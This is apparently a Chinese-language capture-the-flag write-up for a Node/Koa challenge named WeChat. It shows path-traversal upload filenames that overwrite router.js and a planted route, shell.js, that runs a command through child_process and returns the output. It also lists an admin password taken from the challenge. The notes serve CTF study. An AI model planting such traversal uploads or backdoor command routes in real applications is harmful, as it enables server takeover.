## WeChat
#node-文件覆盖-nodemon

![](attachments/Pasted%20image%2020240324202528.png)

文件上传点

![](attachments/Pasted%20image%2020240324203342.png)

![](attachments/Pasted%20image%2020240324203355.png)

构造文件名和hash来实现将router.js 覆盖
hash `/.`
`/../src/route/shell.js` `/../src/route/router.js` 


直接用写入数据的方式注册账号

![](attachments/Pasted%20image%2020240324204729.png)

进入后台
![](attachments/Pasted%20image%2020240324204654.png)

拿到admin密码`c98b2c31-c110-49a2-85e8-07040dc29bef`

这里要用邮箱才能正确登录
shell.js
```js
const router = require('@koa/router')()  
const child_process = require('child_process')  
  
router.get('/wechatAPI/getflag', (ctx) => {  
    var flag = child_process.execFileSync("/readflag").toString()  
    ctx.status = 200  
    ctx.body = {  
        msg: flag  
    }  
})
```

router.js
```js
const router = require('@koa/router')()

const commonRouter = require('./commonRouter')
const routeAdmin = require('./admin')
const routeLogin = require('./login')
const routeUpload = require('./upload')
const shell = require('./shell')

router
  .use(routeLogin)
  .use(commonRouter)
  .use(routeUpload)
  .use(routeAdmin)
  .use(shell)

module.exports = router
```